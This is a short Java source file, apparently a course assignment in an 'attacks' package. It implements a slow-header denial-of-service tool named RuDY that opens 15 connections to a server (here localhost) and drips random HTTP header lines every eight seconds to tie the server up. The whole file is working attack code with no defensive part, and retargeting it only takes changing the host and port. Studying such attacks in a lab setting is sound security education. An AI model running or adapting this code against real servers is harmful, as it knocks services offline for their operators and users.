package assignment.attacks;

import java.io.IOException;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ThreadLocalRandom;

public class RuDY {

    static String host = "127.0.0.1";
    static int port = 12345;
    static int threads;

    static List<Socket> socketList;

    public static void main(String[] args) throws IOException, InterruptedException {
        // Not with executor to save resources on attacker side
        socketList = new ArrayList<>();

        for (int c=0; c<15; ++c) {
            openSocket();
        }

        while (true) {
            Thread.sleep(8000);
            for (var socket : socketList) {
                sendLine(socket);
            }
        }
    }

    private static void openSocket() throws IOException {
        Socket socket = new Socket(host, port);

        var ostream = socket.getOutputStream();

        String header = "GET / HTTP/1.1";

        ostream.write(header.getBytes());

        socketList.add(socket);
    }

    private static void sendLine(Socket socket) throws IOException {
        var ostream = socket.getOutputStream();

        StringBuilder field = new StringBuilder();
        for (int c=0; c<8; ++c) {
            byte asciiVal = (byte) (ThreadLocalRandom.current().nextInt(46) + 'A');
            if (asciiVal > 'Z') {
                asciiVal = (byte) (asciiVal - 'A' - 26 + 'a');
            }
            field.append((char) asciiVal);
        }

        String line = "\r\nX-" + field.toString() + ": " + ThreadLocalRandom.current().nextInt(10000);
        System.out.print(line);

        ostream.write(line.getBytes());
    }
}
